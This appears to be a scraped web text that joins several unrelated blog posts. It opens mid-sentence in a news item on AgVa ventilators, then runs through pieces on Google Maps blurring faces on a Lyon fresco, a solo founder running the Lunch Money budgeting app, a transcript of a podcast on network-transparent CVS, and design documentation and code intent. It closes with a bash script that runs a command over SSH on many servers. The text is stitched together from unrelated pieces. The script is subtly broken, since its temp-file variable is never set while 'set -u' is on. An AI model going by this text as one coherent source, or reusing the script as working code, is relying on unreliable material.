previously reported</span></a><span>, the government then sent the AgVa ventilator to a different panel of doctors, who cleared it with the caveats that the AgVa Covid model ventilator “should not be considered as a replacement for high-end ventilators in tertiary care ICUs” and that “there should be a provision for backup ventilator in the facility where these ventilators are used.”</span></p><p><strong>JJ Hospital Responds</strong></p><p><span>On June 30, Diwarkar Vaish flew to Mumbai’s JJ Hospital and demonstrated AgVa’s newest Covid model to the hospital’s sceptical doctors.

    <p>When passing through the French city of Lyon last summer, I was delighted to learn that it’s home to a collection
        of enormous Frescos scattered throughout town. My girlfriend and I discovered one on accident and made a point of trying to see as many as we could during our time there. Somehow, we
        managed to miss probably the city's most famous: the Fresque des Lyonnais located in the 1st arrondissement.
        It’s a depiction of the Lyon's various historical figures, most of whom are painted out on their balcony.</p>

    <p>
        <img src="https://thisislyon.fr/wp-content/uploads/2018/04/lyon-fresque-lyonnais-general.jpg">
        <br>
        (source: <a href="https://thisislyon.fr/things-to-do/historical-monuments/la-fresque-des-lyonnais/">https://thisislyon.fr/things-to-do/historical-monuments/la-fresque-des-lyonnais/</a>)
    </p>

    <p>
        I was revisiting Lyon (virtually) the other day after reading <a href="https://www.newyorker.com/magazine/2020/04/13/baking-bread-in-lyon">a New Yorker article</a> about the
        bakery located in
        the same building as the Fresco. After dropping myself in on Google Maps to take a closer look at the
        storefront, I decided to continue on a little virtual tour. I soon noticed something strange: Google Maps was
        blurring the faces of the painting.
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/1_blurred_faces.png">
    </p>

    <p>
        At first, this made me laugh - I figured the algorithm Google uses was too smart for its own good. I suppose
        this isn’t all that odd, the paintings on the city’s frescos tend to be pretty realistic and the buildings
        themselves often blend into their surroundings.
    </p>

    <p>I was about to close the tab when I noticed that it didn’t seem to be *that* smart:</p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/2_non_blurred.png">
    </p>

    <p>
        I started moving the Google camera around to get a closer look, which led to the further realization that Google
        was actually censoring the faces in what appears to be real time:
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/3_lumiere_a.png">
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/4_lumiere_b.png">
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/5_lumiere_c.png">
        <br>
        The Lumière brothers, captured from three adjacent positions
    </p>

    <p>
        In fact, I was able to reorient myself such that I could make almost every face on the wall become clear. What
        still puzzles me is that to my naked eye, none of the changes in perspective really made the faces look any less
        or more “real”.
    </p>

    <p>
        I’m not sure if the face-recognition calculation is actually run on the spot (for performance’s sake, I would
        guess that it isn’t) but clearly something is going on here. It’s strange. One would assume that if a “person”
        is identified, their face is blurred no matter what. This doesn’t appear to be true, since its possible to
        re-orient ones self along the street in order to reveal different faces. Google seems to make each evaluation
        based solely on the camera's current location and perspective.
    </p>

    <p>
        Out of curiosity, I played with some of the pedestrians nearby to see if there was some way to reproduce the
        results. This was a bit tricky, since advancing the camera even by one unit doesn’t necessarily hold the guarantee
        that the same pedestrian will still be around.
    </p>
        
    <p>
        <img src="http://www.chrislessard.co/assets/images/6_man_far.png">
        <br>
    </p>

    <p>
        Google doesn’t seem to blur this guy until you zoom in a unit closer (I had to manually zoom myself in the above picture to get
        the shot):
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/7_man_close.png">
        <br>
    </p>

    <p>His face is pretty blurry in that first photo anyways, so it's likely that Google is determining whether there is
        enough information to justify the blur.</p>
    
    <p>
        I didn't play around too much more with it. My guess is that the blurring is correct 99% of the time, when it comes to real humans. Still, it was interesting to get a bit of insight into how (well, when) the blurring is applied. Do I get karma for finding a bug with The Frescos?
    </p>

<p>Hello! 👋 My name is Jen and I’m the founder, engineer, designer and customer support at <a href="https://lunchmoney.app/">Lunch Money</a>, a personal finance and budgeting web app.</p>

<p>In short, I am a company of one. I answer the customer support emails and I code and deploy new features. I also manage the <a href="https://developers.lunchmoney.app/" target="_blank">API docs</a> and <a href="https://support.lunchmoney.app/" target="_blank">knowledge base</a>, poke around the logs when there are issues, write the <a href="https://lunchmoney.app/sample_newsletter" target="_blank">bi-monthly newsletters</a> and I designed the logo!</p>

<p>As the company scales, so too must all aspects of my work which I break down into 4 parts: customer support, engineering, product and marketing.</p>

<p><strong>Finding opportunities for process optimization is honestly one of the more fun parts of running a business</strong>. I greatly attribute these to how I’ve been able to stay both solo &amp; sane up until now, currently with 600+ users and $45,000 ARR. In this post, I’m excited to share some of my most successful strategies along with anecdotes from my experience working on Lunch Money.</p>



<p>In the last 14 days, here’s what I got done across all departments:</p>

<ul>
<li><strong>Product:</strong> Launched an internal beta testers program and two sets of new features to test</li>
<li><strong>Engineering:</strong> Wrapped up a 2-week long refactor of some core components on the client-side</li>
<li><strong>Engineering:</strong> Launched a major feature: advanced transaction filters</li>
<li><strong>Engineering:</strong> Closed 13 tickets related to feature improvements and bug fixes</li>
<li><strong>Marketing:</strong> Sent out a newsletter outlining the latest new features</li>
<li><strong>Marketing:</strong> This blog post</li>
<li><strong>Marketing:</strong> Added new pages to the marketing site (<a href="https://lunchmoney.app/features/rules">Rules</a> and <a href="https://lunchmoney.app/features/collaboration">Collaboration</a>) and updated the icons in <a href="https://lunchmoney.app/features">Features</a></li>
<li><strong>Support:</strong> Received 239 inbound support tickets and sent out 358 emails</li>
</ul>

<p>What makes all this work bearable for me is the fact that there is so much variety (which, of course, is the spice of life!). I love being able to switch between tasks to keep the job interesting and my mind refreshed while still being productive overall.</p>

<p><em>Case in point: I just finished a major refactor and pushed out 2 major features to beta, so writing this blog post right now feels like a vacation for my brain.</em></p>

<p>To state the obvious, I enjoy being hyper-efficient (without burning myself out, of course). Even though I am a single person, I can still automate, optimize and parallelize processes.</p>



<h2 id="implement-safeguards">Implement safeguards</h2>

<p><i>Ah, the blissful beginnings of Lunch Money when I’d push code directly to production several times a day.</i></p>

<p>At 500+ users now, those days are long gone and I’ve since needed to adopt the more boring but responsible approach of implementing safeguards to prevent shipping faulty code.</p>

<p>For one, <b>I’ve been thoroughly reviewing my own code before every change</b>. Every major feature, improvement and bug fix lives in a feature branch that I still, by habit from the corporate days, prepend with <code>jen/</code>. After verifying everything works great locally, I make sure to take a break first, whether that’s working on a completely unrelated task, going for a meal or going to bed. The point of this is to ensure that I’m code reviewing with a clear head.</p>

<p>While adhering to these standards of code reviewing myself may add extra time to my overall process, it potentially saves hours of bug-fixing, answering related support tickets and self-loathing (I’m half-kidding here) down the line if I accidentally ship bad code.</p>

<center><blockquote><p lang="en" dir="ltr">New phase of Lunch Money– no more pushing major features straight to production 🤯😂 <a href="https://t.co/RYsz7BnU3L">https://t.co/RYsz7BnU3L</a></p>— Jen (@lunchbag) <a href="https://twitter.com/lunchbag/status/1256987437600927744?ref_src=twsrc%5Etfw">May 3, 2020</a></blockquote> </center>

<p><b>I also recently implemented an internal beta-testing program open to Lunch Money subscribers.</b> With more users accessing my app on a regular basis, the stakes are higher to ship a version that’s as bug-free as possible.</p>

<p>As an engineering team of one, it’s nearly impossible to always get it right the first time, despite having tests (what if I missed an edge case?) or testing locally extensively (how I think my users will use a feature is not always so).</p>

<p>The beta-testing program has provided some additional benefits. It’s nice to have a cohort of users with whom I can have a more candid conversation about Lunch Money and it’s also a great way to show users that their feedback is valued!</p>

<h2 id="automate-later-than-you-need-to">Automate later than you need to</h2>

<p>While automating tasks can save a lot of time in the long-term, it doesn’t always make sense to automate right off the bat.</p>

<p>Automating too late is not a bad thing. I’ll have done the manual work enough times to understand how to eventually automate the task and what edge cases to look out for. I equate it to doing a job yourself before hiring someone– it’s always better to grok the requirements first to some degree so you can understand how to best utilize who you’ve brought on (and appreciate them more!).</p>

<p>I manually triggered the emails for bi-monthly account summaries for months because I wasn’t confident the sending cadence was reasonable. After observing open rates and collecting user feedback, these are now automated to go out on the 5th &amp; 25th of every month.</p>

<p>Something that I’m glad I didn’t spend the time to automate at all was the referral program. If an existing user refers a new user and the new user subscribes to a plan, then both users will receive credit for 1 month.</p>

<p>In the end, the referral program only brought on 11 extra users. It was not a pain at all to manually process rewards for those who did. If I had spent time conjuring up all the edge cases and automating this process, it would not have been worth the time investment.</p>

<h2 id="keep-low-hanging-fruits-in-the-back-pocket">Keep low-hanging fruits in the back pocket</h2>

<p>In my task management system, I use a tag (🍏) to denote which tasks are low-hanging fruits. For the uninitiated, low-hanging fruits are quick tasks that are easy to knock out, such as one-liners or 5-minute fixes.</p>

<p><img src="https://media.giphy.com/media/YP1Jb0JNc7kqFDbdjm/giphy.gif"></p>

<p>I find that keeping these around and tackling them on days when you feel generally unmotivated can really help raise spirits. Still being able to get something completed and shipped is a great way to get out of a slump.</p>



<h2 id="timing-marketing-pushes">Timing marketing pushes</h2>

<p>At Lunch Money, a big part of the business is using the services of Plaid for bank syncing. Plaid charges on a monthly basis which means that if a user signs up on April 30, connects a bank account immediately and doesn’t end up subscribing at the end of their 14-day trial, they will charge me for this user in both April &amp; May’s invoices.</p>

<p>This realization coupled with my intense aversion to paying more than I need to has shaped a lot of practices at Lunch Money.</p>

<p>For one, the data retention policy used to be 30 days which means if your trial ends and you didn’t put in your billing information, your data will be deleted in 30 days. This certainly guarantees that I’ll be overpaying for churned users and is the reason why the data retention policy has since been revised to 5 days.</p>

<p>In total, a user who does not end up subscribing can spend up to 26 days in the Lunch Money system. This comprises of a 14-day trial, the potential for a 1 week trial extension and a 5 day grace period. Assuming enough users connect their bank accounts, the best way to minimize my costs for churned users is to ensure their lifetimes are within one calendar month.</p>

<p><img src="https://lunchbag.ca/uploads/calendar-1.png"></p>

<p>As a result, I always schedule marketing pushes such as blog posts and product launches in the first few days of the month. When I came to this realization, my next Plaid bill went down for the first time.</p>

<h2 id="merging-marketing-and-engineering-for-a-combo-win">Merging marketing and engineering for a combo win</h2>

<p>Taking this a step further, the perk of having a spike in new users is that their trial periods more-or-less overlap. Usually when a new user signs up, they will poke around the product and maybe send in a bug report, a feature request or another piece of feedback. If I reply and address their feedback by putting in a fix or shipping their requested feature within days, more often than not, they end up converting into a happy customer.</p>

<p>I’ve therefore identified the following cycle to maximize potential conversions from spikes in user signups:</p>

<p><img src="https://lunchbag.ca/uploads/gantt-2.png"></p>

<p>After a marketing push, let’s say a product launch, I will see an immediate increase in signups lasting about 3 days and then slowly trailing off.</p>

<p>Over the next few days, I’ll start hearing from these new users via support tickets. I prioritize responding to them and I get to work. Showing these users that I’m committed to improving Lunch Money based on their feedback is a great and honest sales tactic.</p>

<p>About 3 days before the initial wave of user trials ends, I wrap up my engineering sprint and send out a newsletter detailing the latest features and improvements. This re-enforces to new users that the product is under continuous development.</p>

<p>Finally, I have a drip campaign that automatically notifies users a few days before their trial expires and on the actual date of expiry. This period of time is when I typically see most users convert 🤞.</p>



<p>I used to think that if I were to hire someone, it would first be a customer support agent but I’ve since been moving away from that idea. Users are constantly surprised (in a good way!) when they realize the founder is responding to their bug reports or feature requests directly.</p>

<p><strong>Consistently providing great customer support is a long-term investment for Lunch Money</strong> as it is undoubtedly a great way to turn customers into champions. As I receive and respond to support tickets, I’m also able to identify and overhaul the common sources of trouble for users.</p>

<p>I’ve always believed that customer support would be the most important and the hardest part of the business to scale, especially if I have the goal of staying a company of one.</p>

<p>Corroborating data from <a href="https://emailmeter.com/">EmailMeter</a> and my database, it seems my changes are making a difference. Despite a growing user base, inbound support emails remain fairly steady!</p>

<p><img src="https://lunchbag.ca/uploads/screen-shot-2020-05-21-at-4-20-15-pm.png"><span>Handling support on my own should be sustainable at least for the foreseeable future!</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Software is just the tool and it should get out of your way. In this episode, Jim discusses how to build a great developer tool.&nbsp; It all started with: “What’s the worst software that you use every day?”&nbsp;</span></p><h3><b>Transcript</b></h3><p><em>This is a machine-translated transcript. Podcast page for<a href="https://corecursive.com/software-that-doesnt-suck-with-jim-blandy/" target="_blank" rel="noopener noreferrer"> this episode is here</a></em></p><h3><b>Introduction</b></h3><p><b>Jim:</b><span> Basically, there was a coworker of mine who said, CVS’s repositories indexed backward. <strong>CVS is the software equivalent of a telephone book sorted by telephone number.</strong> And that’s a funny lunch comment, right? And basically I was just thinking about it myself, you know, doing the dishes every night but the thing is you can’t just accept something like that. You have to say, well, wait a second. <strong>If CVS is backward, what would it look like if it were right?&nbsp;</strong></span></p><p><b>Adam:</b><span> Welcome to the CoRecursive, I’m Adam Gordon Bell. Today, our topic is what would it look like if CVS was not backward? CVS is a source control management tool. Think of the early 90’s – Git.</span></p><p><span>Jim Blandy is my guest and he brings us the story of making CVS better.&nbsp;</span></p><p><span>I would guess that a number of features of your current source control tools that you probably use every day we’re influenced by Jim’s work. I also think he has some interesting insights on how you build great developer tools and also how to recognize when some improvements to the existing tools will topple the current market leader are something that he’s done twice.</span></p><p><span>We started the story of the year in 1993. It’s the year the Mosaic web browser came out. You know, email has been around for some time, but the web was fairly young and CVS was the most popular open-source source control system.&nbsp;</span></p><h2><b>Network Transparent CVS &amp; The Commune</b></h2><p><b>Jim:</b><span> So I went on this trip that I was going to go on in Europe and Japan, and I came back to the US and I had no job. And no apartment. And my friend had gotten a job. My friend Carl Fogel had gotten a job working at the University of Illinois, Urbana Champaign on a gene-editing mode for Emacs. And this is an Emacs, you visit a file that’s full of genetic data and Emacs will bring it up and it’ll apply colors to it, and you can like select, you know, rectangles and stuff like that.</span></p><p><span>But he was living in Illinois at this lab at UIUC, and I was living in Indiana and so we were collaborating across the net and this was 1993. And so the way you collaborated across the net was you shipped people patches, you emailed people patches, you FTP, do your sources,&nbsp; network, transparent version control was not a thing. But, I had an old friend from college who had gone to work for a Silicon Valley startup, except he didn’t want to live in Silicon Valley. He wants to live on a commune in the Hills of Virginia. And so they ran a frame relay line, out to the commune because, you know rural telephone access, right? And there he was on this commune, you and everybody else was making hammocks and nut butter, and he was hacking on code for Silicon Valley and so his income was probably a significant portion of the whole communes income, but, there he was, and he realized that it was kind of lousy doing this collaboration at a distance, his name is Jim Kingdon and he was just an amazing hacker and he sort of disappeared from the world after this and I don’t know why, because he is amazingly talented. What he did is he took the CVS version control system, this was like I said, this is ‘90, ‘93.</span></p><p><span>It was designed for a situation where you have lots of people using the same computer, right? And so you have your CVS repository in one part of the file system that’s shared by all the users. And then people are checking out copies of the tree into their own home directories, making local changes, doing updates, doing commits, right?</span></p><p><span>And so they’re doing all of this activity but it’s all on one machine. It’s all one local file system because people would share their computers back then because that was what you have to do.&nbsp; So what Jim Kingdon did is he took this CVS version control system that was designed to work locally only and basically, by I sheer force of intellectual will, he ripped it apart into a client and server and he invented a protocol to go with it that like and the protocol even like, you know, minimize round trip times to keep latency down and all this just amazing stuff, right? It’s a program that wasn’t designed to be a network program at all, and he turned it into a network program and then he used Kerberos for authentication and it was real network security back in 1993. He used it for collaboration with his startup that he was working for, which was, Signus Solutions in Silicon Valley. And so, you know, it was this amazing thing but he didn’t publish it, he just used it.</span></p><p><span>He wrote it for himself and for maybe other people in his company. And then he just used it and so I had heard that he had done this and here I am trying to collaborate with my friend Carl in Illinois and so I wrote him and I said, Hey, you know, do you think I could get a copy of this code?</span></p><p><span>And he says, “Oh yeah, sure. But on one condition, you can’t ask me any questions.” because basically he doesn’t want to get into the support thing. I think this is probably why he didn’t publish it in the first place.</span></p><p><b>Adam:</b><span> That makes sense. Yeah.</span></p><p><b>Jim:</b><span>&nbsp;So I said, “Oh yeah, sure, fine.” You know, give me a copy. And so he sends me a tarball of it and other sources and so immediately I asked him a question and he’s like, I told you not to ask me any questions.</span></p><p><span>Carl and I started using it like, this is amazing! Right? Because you set up a server on some machine somewhere and you do a checkout and you get the sources and then you work locally and nobody gets in your way, and then you just commit and poof! it’s there for everybody else to see.</span></p><p><span>Right? It’s just a whole new world. And so, you know, we were just blown away,&nbsp; at how much better it was to collaborate. Over the net using the network transparent CVS.&nbsp;</span></p><p><b>Adam: </b><span>So since CVS is GPL, Jim takes these improvements and he releases them to the world like a fork.</span></p><h2><b>Waiting Tables &amp; Drug testing</b></h2><p><b>Jim:</b><span> At first, the official CVS, the mainstream CVS distribution was like, Oh yeah, interesting work. But you know, we have our own ideas about how we’re going to do things because everybody — nobody likes existing code. Everybody likes imaginary code because imaginary code is always perfect.&nbsp;</span></p><p><b>Adam:</b><span> Yeah. And you’re like, we already have this. It’s done, you can use it.</span></p><p><b>Jim:</b><span> Yeah, you could use it and then but they didn’t want it because they wanted to do their own thing. But you know, after a few months it becomes clear that they don’t have network transparency and we do have network transparency and basically everybody is switching over to cyclic CVS, which is what we called it and they capitulate and say, “okay, I guess we’ll merge your changes”. And that is how network transparent CVS came to be. And, you know, within a year, all of the open-source worlds were using this. Because when you think about the kind of collaboration that has to happen with open source, you know, it’s all distributed teams.</span></p><p><span>It’s people from everywhere you get volunteers, you have no idea where they’re coming from. There’s no physical locality to it at all and it took over the open-source world by storm and within a few years, pretty much CVS was the standard.</span></p><p><b>Adam:</b><span> This network transparent CVS became such the standard both in open source and in the corporate world. Jim got some interest in contracting work, just helping people understand how to use it.&nbsp;</span></p><p><b>Jim:</b><span> One of the biggest thrills I ever got was when I was just going around to different companies and government groups and teaching them how to use CVS.</span></p><p><span>And I got an invitation to teach for a few days. I think it was a three-day course at the Goddard space flight center, out on the East coast and so here I was teaching these folks who were doing satellite development and doing weather analysis. And I remember one day over lunch,</span></p><p><span>one of them said, you know, we’ve been having this bug with CVS I wonder if you could help us out with it and so I said, sure. And so we walked down to his cubicle and AEs says, well, okay, here, let’s, let’s, and so we just check something out. It just checks out a tree with CVS. And I say, well, what is it?</span></p><p><span>And he says, Oh, this is the stuff that analyzes satellite data, satellite images,&nbsp; to analyze,&nbsp; hurricanes and predict where they’re going to go. And there was just something like just seeing that checkout, right? CVS lists each file as it downloads it from the server and checks it out. It’s like, Whoa! I’m actually helping people do stuff, you know? Right. Here’s this person who is just trying to, you know, track hurricanes. And because we made this thing, they were able to do that&nbsp; is a really exciting feeling. That they’re not really interested in your software they’re just using it to get something done and that because you were there, they were able to do it.</span></p><h2><b>Cyclic Software</b></h2><p><b>Adam:</b><span> Jim and his buddy Carl didn’t let this good opportunity go to waste. So they start a business cyclic software that offers support for cyclic CVS for network-transparent source control.&nbsp;</span></p><p><b>Jim:</b><span> Our little business failed to die in the first four horrible ways that businesses always die.&nbsp; We’ve paid ourselves a salary, we earned back our initial investment and actually made a little bit of money beyond that and we had customers. One of our clients was Goldman Sachs. It turned out the Goldman Sachs was using CVS internally and they really liked network transparent CVS. And so Goldman Sachs wanted us to port it. I think they wanted reserved checkouts or something like that.</span></p><p><span>And so here we are, two guys basically we’re grad student age and we’re like, okay, we’re going to write a contract with Goldman Sachs and so we’d go consult a lawyer and stuff like that and we send Goldman Sachs our little contract. You know their full legal department comes to bear on this thing and everything that we wrote them becomes exhibit A and then they have this big, whatever is 15 pages of …</span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">


<p>Only loosely related to what it should do.</p>


<p>Code says what it does. That's important for the computer, because code is the way that we ask the computer to do something. It's OK for humans, as long as we never have to modify or debug the code. As soon as we do, we have a problem. Fundamentally, debugging is an exercise in changing what a program does to match what it should do. It requires us to know what a program should do, which isn't captured in the code. Sometimes that's easy: What it does is crash, what it should do is <em>not crash</em>. Outside those trivial cases, discovering intent is harder.</p>

<p>Debugging when <em>should do</em> is subtle, such as when building distributed systems protocols, is especially difficult. In our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper, we say:</p>

<blockquote><p>Our code reviews, simworld tests, and design meetings frequently referred back to the TLA+ models of our protocols to resolve ambiguities in Java code or written communication.</p></blockquote>

<p>The problem is that the implementation (in Physalia's case the Java code) is both an imperfect implementation of the protocol, and an overly-specific implementation of the protocol. It's overly-specific because it needs to be fully specified. Computers demand that, and no less, while the protocol itself has some leeway and wiggle room. It's also overly-specific because it has to address things like low-level performance concerns that the specification can't be bothered with.</p>

<p><em>Are those values in an ArrayList because order is actually important, or because O(1) random seeks are important, or some other reason? Was it just the easiest thing to write? What happens when I change it?</em></p>

<p>Business logic code, while lacking the cachet of distributed protocols, have even more of these kinds of problems. Code both over-specifies the business logic, and specifies it inaccurately. I was prompted to write this by a tweet from @mcclure111 where she hits the nail on the head:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">Since most software doesn't have a formal spec, most software "is what it does", there's an incredible pressure to respect authorial intent when editing someone else's code. You don't know which quirks are load-bearing.</p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422600236765186?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>This is a major problem with code: <em>You don't know which quirks are load-bearing.</em> You may remember, or be able to guess, or be able to puzzle it out from first principles, or not care, but all of those things are slow and error-prone. What can we do about it?</p>

<p><strong>Design Documentation</strong></p>

<p>Documentation is uncool. Most software engineers seem to come out of school thinking that documentation is below them (<em>tech writer work</em>), or some weird thing their SE professor talked about that is as archaic as Fortran. Part of this is understandable. My own software engineering courses emphasized painstakingly documenting the implementation in UML. No other mention of documentation was made. Re-writing software in UML helps basically nobody. I finished my degree thinking that documentation was unnecessary busywork. Even the <a href="https://agilemanifesto.org/">Agile Manifesto</a> agreed with me<sup><a href="#foot1">1</a></sup>:</p>

<blockquote><p>Working software over comprehensive documentation</p></blockquote>

<p>What I discovered later was that design documentation, encoding the intent and decisions made during developing a system, helps teams be successful in the short term, and people be successful in the long term. Freed from fitting everything in my head, emboldened by the confidence that I could rediscover forgotten facts later, I could move faster. The same applies to teams.</p>

<p>One thing I see successful teams doing is documenting not only the <em>what</em> and <em>why</em> behind their designs, but the <em>how they decided</em>. When it comes time to make changes to the system—either for debugging or in response to changing requirements—these documents are invaluable. It's hard to decide whether its safe to change something, when you don't know why it's like that in the first place. The record of how you decided is important because you are a flawed human, and understanding how you came to a decision is useful to know when that decision seems strange, or surprising.</p>

<p>This documentation process doesn't have to be heavyweight. You don't have to draw painstaking <a href="https://en.wikipedia.org/wiki/Entity%E2%80%93relationship_model">ER diagrams</a> unless you think they are helpful. You should probably ignore UML entirely. Instead, describe the system in prose as clearly and succinctly as you can. One place to start is by building an RFC template for your team, potentially inspired by one that you find on the web. <a href="https://static1.squarespace.com/static/56ab961ecbced617ccd2461e/t/5d792e5a4dac4074658ce64b/1568222810968/Squarespace+RFC+Template.pdf">SquareSpace</a>'s template seems reasonable. Some designs will fit well into that RFC format, other's won't. Prefer narrative writing where you can.</p>

<p>Then, keep the documents. Store them somewhere safe. Soak them in vinegar <a href="https://www.almanac.com/content/home-remedies-cough-relief">and tie them around your chest</a>. You're going to want to make sure that the people who need to maintain the system can find them. As they are spelunking through history, help them feel more like a library visitor and less like Lara Croft.</p>

<p>I'm not advocating for Big Design Up Front. Many of the most important things we learn about a project we learn during the implementation. Some of the most important things we learn years after the implementation is complete. Design documentation isn't a static one-time ahead-of-time deliverable, but an ongoing process. Most importantly, design documentation is not a commitment to bad ideas. If it's wrong, fix it and move forward. Documentation is not a deal with the devil.</p>

<p><strong>Comments</strong></p>

<p>Few topics invite a programmer flame war like comments. We're told that comments are silly, or childish, or make it hard to show how manly you are in writing that convoluted mess of code. If it was hard to write, it should be hard to read. After all, you're the James Joyce of code.</p>

<p>That silliness aside, back to @mcclure111's thread:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">This means comments that *reveal* authorial intent are valuable, and comments that reveal *there was no authorial intent* are even more valuable. Without those hints, you're left editing superstitiously, preserving quirks even when you don't know why. <a href="https://t.co/YhvWnXjp9i">https://t.co/YhvWnXjp9i</a></p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422825831596039?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>Comments allow us to encode <em>authorial intent</em> into our code in a way that programming languages don't always. Types, traits, interfaces, and variable names do put intent into code, but not completely (I see you, type system maximalists). These same things allow us to communicate a lack of intent—consider <a href="https://docs.oracle.com/javase/8/docs/api/java/util/RandomAccess.html">RandomAccess</a> vs <a href="https://docs.oracle.com/javase/8/docs/api/java/util/ArrayList.html">ArrayList</a>—but are also incomplete. Well-commented code should make the intent of the author clear, especially in cases where that intent is either lost in the translation to code, or where implementation constraints hide the intent of the design. Code comments that link back to design documents are especially useful.</p>

<p>Some languages need comments more than others. Some, like SQL, I find to nearly always obscure the intent of the design behind implementation details.</p>

<p><strong>Formal Specification</strong></p>

<p>In <a href="https://cacm.acm.org/magazines/2015/4/184705-who-builds-a-house-without-drawing-blueprints/fulltext">Who Builds a House Without Drawing Blueprints?</a> Leslie Lamport writes:</p>

<blockquote><p>The need for specifications follows from two observations. The first is that it is a good idea to think about what we are going to do before doing it, and as the cartoonist Guindon wrote: "Writing is nature's way of letting you know how sloppy your thinking is."</p>

<p>The second observation is that to write a good program, we need to think above the code level.</p></blockquote>

<p>I've found that specification, from informal specification with narrative writing to formal specification with TLA+, makes writing programs faster and helps reduce mistakes. As much as I like that article, I think Lamport misses a key part of the value of formal specification: it's a great communication tool. In developing some of the trickiest systems I've built, I've found that heavily-commented formal specifications are fantastically useful documentation. Specification languages are all about <em>intent</em>, and some make it easy to clearly separate intent from implementation.</p>

<p>Again, from our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper:</p>

<blockquote><p>We use TLA+ extensively at Amazon, and it proved exceptionally useful in the development of Physalia.  Our team used TLA+ in three ways: writing specifications of our protocols to check that we understand them deeply, model checking specifications against correctness and liveness properties using the TLC model checker, and writing extensively commented TLA+ code to serve as the documentation of our distributed protocols. While all three of these uses added value, TLA+’s role as a sort of automatically tested (via TLC),and extremely precise, format for protocol documentation was perhaps the most useful.</p></blockquote>

<p>Formal specifications make excellent documentation. Like design docs, they aren't immutable artifacts, but a reflection of what we have learned about the problem.</p>

<p><strong> Conclusion </strong></p>

<p>Building long-lasting, maintainable, systems requires not only communicating with computers, but also communicating in space with other people, and in time with our future selves. Communicating, recording, and indexing the intent behind our designs is an important part of that picture. Make time for it, or regret it later.</p>

<p>There are complex solutions available for server management, some of you might even be on the <em>containerization train</em>.
Sometimes you just want to run a quick command on every server, it could be a one off to check <code>uptime</code> or a simple
check for <code>lockfiles</code>. Here’s a simple script which runs a shell command on a list of servers.</p>
<div><div><pre><code><span>#!/usr/bin/env bash</span>

<span>set</span> <span>-u</span>

<span>ACTION</span><span>=</span><span>${</span><span>1</span>:?<span>"Must supply action"</span><span>}</span>
<span>HOST</span><span>=</span><span>${</span><span>2</span>:?<span>"Must supply host name"</span><span>}</span>

<span>source</span> ./scripts/lib.sh

<span># Expand host string</span>
<span>HOSTS</span><span>=</span><span>"</span><span>$(</span>GET_HOSTS <span>$HOST</span><span>)</span><span>"</span>            <span># GET_HOSTS is a lists all hosts</span>

<span># Command to SSH</span>
SSH_COMMAND<span>()</span> <span>{</span>
    <span>local </span><span>ip</span><span>=</span><span>"</span><span>$(</span>GET_IP <span>$1</span><span>)</span><span>"</span>           <span># GET_IP is maps hostname to IP</span>
    ssh <span>"</span><span>${</span><span>TARGET_USER</span><span>}</span><span>@</span><span>${</span><span>ip</span><span>}</span><span>"</span> <span>"</span><span>$2</span><span>"</span>
<span>}</span>

<span># Run command for each host</span>
<span>declare</span> <span>-A</span> results
<span>for </span>H <span>in</span> <span>$HOSTS</span><span>;</span> <span>do</span>
    <span># Redirect output to a temp file, later redirect back to stdio</span>

    <span>exec</span> &amp;&gt; <span>${</span><span>temp</span><span>}</span>

    <span># Not the '&amp;', this creates a background process.</span>
    <span># We also source the env on the host,</span>
    <span># as .bashrc and .bash_profile are finicky at times</span>
    <span>printf</span> <span>"</span><span>\n</span><span>Running command %s %s </span><span>\n</span><span>"</span> <span>"</span><span>${</span><span>ACTION</span><span>}</span><span> </span><span>${</span><span>H</span><span>}</span><span>"</span>
    SSH_COMMAND <span>"</span><span>$H</span><span>"</span> <span>"source ~/app/scripts/env.sh; </span><span>${</span><span>ACTION</span><span>}</span><span>"</span> &amp; 

    <span># '$!' is the PID which maps to the correct temp file</span>
    results[<span>$!</span><span>]=</span><span>$temp</span>
<span>done</span>

<span># Restore stdout and stderr</span>
<span>exec</span> &amp;&gt; /dev/tty

<span># Wait for the jobs that were executed</span>
<span>for </span>pid <span>in</span> <span>"</span><span>${</span><span>!results[@]</span><span>}</span><span>"</span><span>;</span> <span>do
    </span><span>wait</span> <span>$pid</span>
    <span>cat</span> <span>"</span><span>${</span><span>results</span><span>[</span><span>$pid</span><span>]</span><span>}</span><span>"</span>
<span>done</span>
</code></pre></div></div>
<p>There’s a lot to dissect in this little snippet. Let’s get right to it.</p>
<ul>
<li><code>set -u</code>: Most bash guides will ask you to use <code>set -eEuo pipefail</code>, but you would not want to use that especially
when you parallelize using background proccesses in bash. This would mean partial execution and we want to avoid that
all costs. The only error that we care about is <em>undefined variables</em>, hence the <em>set -u</em></li>
<li><code>GET HOSTS</code>: A simple function to generate a list of hosts that you want to run the command on.</li>
<li><code>exec &amp;&gt; ${temp} and exec &amp;&gt; /dev/tty</code>: This redirects the output temporarily and later resets it to the terminal.</li>
<li><code>results[$!]=$temp</code>: To keep track of which pid points to which output file.</li>
<li><code>for pid in "${!results[@]}"</code>: Traverse over every pid in the map and wait on it.</li>
</ul>
<p>This simple scripts saves a lot of time especially when you’re managing a cluster of servers.</p>

July 4, 2020 | https://hamptonmoore.com/posts/weird-wifi-names-cont/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-names-cont/">archive.org</a>
